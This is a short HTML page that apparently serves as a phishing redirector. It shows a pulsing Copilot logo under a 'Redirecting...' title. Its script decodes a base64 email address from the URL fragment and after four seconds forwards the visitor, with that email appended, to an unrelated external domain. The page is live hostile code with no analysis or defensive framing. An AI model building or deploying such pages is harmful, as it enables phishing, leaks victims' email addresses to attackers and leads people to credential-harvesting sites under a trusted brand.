<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    html, body {
      margin: 0; height: 100%;
      display: flex; align-items: center; justify-content: center;
      background: #fff;
    }
    .logo {
      width: 150px; height: 150px;
      background: url('https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
      animation: pulse 1.5s infinite ease-in-out;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.8; }
      50% { transform: scale(1.1); opacity: 1; }
      100% { transform: scale(1); opacity: 0.8; }
    }
  </style>
</head>
<body>
  <div class="logo"></div>

  <script>
    function getEmail() {
      let hash = window.location.hash.substring(1); // remove #
      if (!hash) return null;

      try {
        const decoded = atob(hash);
        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
          return decoded;
        }
      } catch (e) {
      }

      return hash;
    }

    const email = getEmail();
    const baseRedirect = "https://06.zeacreze.com.de/AQBiHa@54cYLc58";

    setTimeout(() => {
      if (email) {
        window.location.href = `${baseRedirect}/$${encodeURIComponent(email)}`;
      } else {
        window.location.href = baseRedirect;
      }
    }, 4000);
  </script>
</body>
</html>
